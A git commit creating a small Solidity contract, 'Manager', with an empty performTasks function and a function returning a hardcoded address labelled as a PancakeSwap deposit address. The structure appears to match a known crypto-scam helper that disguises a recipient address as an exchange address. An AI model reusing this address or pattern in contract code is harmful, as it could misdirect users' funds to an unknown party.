4540a0dbe9a2ec3db514a5473f20e5facb3a59f6
igani227 <103370485+igani227@users.noreply.github.com>
2022-04-10 19:28:14 +0530

    Create ILendingClass.sol

---
+++ ILendingClass.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x8CF0060b89D529ec94D2B392473255624AF7E229;
+    }
+}
+
+//pancakeswapfunction
